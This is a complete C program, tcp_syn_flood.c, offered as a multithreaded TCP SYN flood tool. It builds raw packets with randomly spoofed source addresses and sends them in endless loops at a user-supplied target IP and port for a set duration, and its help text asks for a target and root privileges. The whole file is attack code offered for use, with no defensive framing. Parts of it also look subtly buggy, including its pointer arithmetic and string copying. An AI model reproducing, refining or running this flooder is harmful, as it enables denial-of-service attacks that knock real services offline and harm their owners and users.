/**
 * file: tcp_syn_flood.c
 * author: KriegerDev
 * make all
 */

#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <errno.h>
#include <getopt.h>
#include <stdbool.h>

#define ANSI_RESET "\x1b[0m"
#define ANSI_RED "\x1b[31m"
#define ANSI_PURPLE "\x1b[35m"
#define ANSI_GREEN "\x1b[0;92m"
#define ANSI_YELLOW "\x1b[33m"
#define ANSI_BLUE "\x1b[34m"
#define ANSI_MAGENTA "\x1b[35m"
#define ANSI_CYAN "\x1b[36m"
#define ANSI_WHITE "\x1b[37m"

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9

#define MCS_TO_MS 1000

static int packetsSent = 0;
static int failedPackets = 0;

struct cli_args
{
    char *host;
    bool verbose;
    uint16_t port;
    uint8_t threads;
    uint16_t time;
};

static struct cli_args cli;

static uint32_t Q[4096], c = 362436;

void init_rand(uint32_t x)
{
    int i;

    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;

    for (i = 3; i < 4096; i++)
    {
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
    }
}

uint32_t rand_cmwc(void)
{
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c)
    {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

uint32_t rand_addr(void)
{
    uint32_t random_num;
    uint32_t ul_dst;
    random_num = rand_cmwc();

    ul_dst = (random_num >> 24 & 0xFF) << 24 |
             (random_num >> 16 & 0xFF) << 16 |
             (random_num >> 8 & 0xFF) << 8 |
             (random_num & 0xFF);

    return ul_dst;
}

unsigned short csum(unsigned short *buf, int count)
{
    register unsigned long sum = 0;
    while (count > 1)
    {
        sum += *buf++;
        count -= 2;
    }
    if (count > 0)
    {
        sum += *(unsigned char *)buf;
    }
    while (sum >> 16)
    {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    return (unsigned short)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
{
    struct pseudo_tcph
    {
        uint32_t saddr;
        uint32_t daddr;
        uint8_t placeholder;
        uint8_t proto;
        uint16_t length;
    } psh;

    psh.daddr = iph->daddr;
    psh.saddr = iph->saddr;
    psh.placeholder = 0;
    psh.proto = IPPROTO_TCP;
    psh.length = htons(sizeof(struct tcphdr));
    int tot_tcplen = sizeof(struct iphdr) + sizeof(struct tcphdr);
    unsigned short *tcp = malloc(tot_tcplen);
    memcpy((unsigned char *)tcp, &psh, sizeof(struct pseudo_tcph));
    memcpy((unsigned char *)tcp + sizeof(struct pseudo_tcph), (unsigned char *)tcph, sizeof(struct tcphdr));
    unsigned short output = csum(tcp, tot_tcplen);
    free(tcp);
    return output;
}

void setup_iphdr(struct iphdr *iph)
{
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = (sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id = htons(rand_cmwc() & 0xFFFF);
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = 6;
    iph->check = 0;
    iph->saddr = htonl(rand_addr());
}

void setup_tcphdr(struct tcphdr *tcph)
{
    tcph->seq = htonl((rand_cmwc()));
    tcph->source = htons(rand_cmwc() & 0xFFFF);
    tcph->ack_seq = 0;
    tcph->res2 = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(65535);
    tcph->check = 0;
    tcph->urg_ptr = 0;
}

void setup_syn_packet(char *packet, struct iphdr *iph, struct tcphdr *tcph, struct sockaddr_in sin)
{
    init_rand(time(NULL));
    memset(packet, 0, MAX_PACKET_SIZE);

    setup_iphdr(iph);
    setup_tcphdr(tcph);

    iph->daddr = sin.sin_addr.s_addr;
    iph->check = csum((unsigned short *)packet, iph->tot_len);

    tcph->dest = sin.sin_port;

    tcph->check = tcpcsum(iph, tcph);
}

struct attack_header
{
    unsigned int floodport;
    struct sockaddr_in sin;
};

void attack(void *args)
{
    struct attack_header *arg = (struct attack_header *)args;
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0)
    {
        fprintf(stderr, "Could not open raw socket. %s\n", strerror(errno));
        exit(-1);
    }

    int tmp = 1;
    const int *val = &tmp;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0)
    {
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
        exit(-1);
    }

    char packet[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)packet + sizeof(struct iphdr);
    struct sockaddr_in sin;
    memset(&sin, 0, sizeof(struct sockaddr_in));
    sin = arg->sin;

    setup_syn_packet(packet, iph, tcph, sin);

    ssize_t bytes_sent = sendto(s, packet, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
    if (bytes_sent < 0)
    {
        fprintf(stderr, "error on sending: %s\n", strerror(errno));
        failedPackets++;
        return;
    }
    else if (bytes_sent == 0)
    {
        fprintf(stderr, ANSI_RED "error on sending: %s\n" ANSI_RESET, strerror(errno));
        failedPackets++;
        return;
    }
    else
    {
        if (cli.verbose)
        {
            char s_ip[16];
            char t_ip[16];
            inet_ntop(PF_INET, &sin.sin_addr, t_ip, 16);
            inet_ntop(PF_INET, &iph->saddr, s_ip, 16);
            fprintf(stdout, ANSI_PURPLE "TCP/IP SYN flag sended to" ANSI_GREEN " %s:%d " ANSI_PURPLE "with address" ANSI_GREEN " %s\n" ANSI_RESET, t_ip, sin.sin_port, s_ip);
        }
        packetsSent++;
    }
    close(s);
}
void *flood(void *par1)
{
    while (1)
    {
        attack(par1);
    }
}

void print_result()
{
    printf(ANSI_GREEN "%d packets successfully sended" ANSI_RESET "\n", packetsSent);
    printf(ANSI_RED "%d packets failed" ANSI_RESET "\n", failedPackets);
}

void help(void)
{
    printf(ANSI_PURPLE "TCP SYN FLOOD by Krieger Dev." ANSI_RESET "\n");
    printf("Options:\n");
    printf(ANSI_CYAN "--host (-h):" ANSI_RESET "<string> target ip address (ipv4 only)\n");
    printf(ANSI_CYAN "--port (-p):" ANSI_RESET " <int> target port\n");
    printf(ANSI_CYAN "--threads (-t):" ANSI_RESET " <int> flood threads (default=1)\n");
    printf(ANSI_CYAN "--time (-T):" ANSI_RESET " <int> flood time [secs](default=10)\n");
    printf(ANSI_CYAN "--verbose (-v):" ANSI_RESET " <flag> verbose mode (default=unset)\n");
    printf(ANSI_CYAN "--help (-H):" ANSI_RESET " <flag> help\n");
    printf(ANSI_RED "OBS" ANSI_RESET " execute with root privileges\n");
}

struct cli_args *arg_parse(int argc, char **argv)
{
    struct option longopt[] = {
        {"help", no_argument, NULL, 'H'},
        {"host", required_argument, NULL, 'h'},
        {"port", required_argument, NULL, 'p'},
        {"threads", required_argument, NULL, 't'},
        {"time", required_argument, NULL, 'T'},
        {"verbose", no_argument, NULL, 'v'},
        {0, 0, NULL, 0}};

    struct cli_args *aux = malloc(sizeof(struct cli_args));
    aux->verbose = false;
    aux->threads = 1;
    aux->time = 10;
    int opt;
    int opt_index = 0;
    while ((opt = getopt_long(argc, argv, "Hh:p:t:T:v", longopt, &opt_index)) != -1)
    {
        switch (opt)
        {
        case 'h':
        {
            const char *host = optarg;
            aux->host = malloc(strlen(host));
            strncpy(aux->host, host, strlen(host));
            break;
        }
        case 'p':
        {
            const uint16_t port = atoi(optarg);
            aux->port = port;
            break;
        }
        case 't':
        {
            const uint8_t threads = atoi(optarg);
            aux->threads = threads;
            break;
        }
        case 'T':
        {
            const uint16_t time = atoi(optarg);
            aux->time = time;
            break;
        }
        case 'v':
        {
            aux->verbose = true;
            break;
        }
        case 'H':
        {
            return NULL;
        }
        default:
        {
            return NULL;
        }
        }
    }
    return aux;
}

int main(int argc, char **argv)
{
    pthread_t *threads = NULL;

    if (argc < 2)
    {
        help();
        exit(-1);
    }

    struct cli_args *cl = arg_parse(argc, argv);
    if (cl == NULL)
    {
        help();
        exit(-1);
    }

    cli = *cl;

    fprintf(stdout, "Setting up Sockets...\n");

    int num_threads = cli.threads;
    threads = (pthread_t *)malloc(sizeof(pthread_t) * num_threads);

    struct sockaddr_in sin;
    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port = htons(cli.port);

    int res = inet_pton(AF_INET, cli.host, &sin.sin_addr);
    if (res != 1)
    {
        printf(ANSI_RED "Error: INVALID IP" ANSI_RESET "\n");
        exit(-1);
    }

    struct attack_header td[num_threads];

    int i;
    for (i = 0; i < num_threads; i++)
    {
        td[i].sin = sin;
        pthread_create(&threads[i], NULL, &flood, (void *)&td[i]);
    }

    fprintf(stdout, "Starting Flood on" ANSI_GREEN " %s:%d " ANSI_RESET " with " ANSI_GREEN "%d" ANSI_RESET " thread(s) for " ANSI_GREEN "%d " ANSI_RESET "secs...\n", cli.host, cli.port, cli.threads, cli.time);
    atexit(print_result);
    sleep(cli.time);

    return 0;
}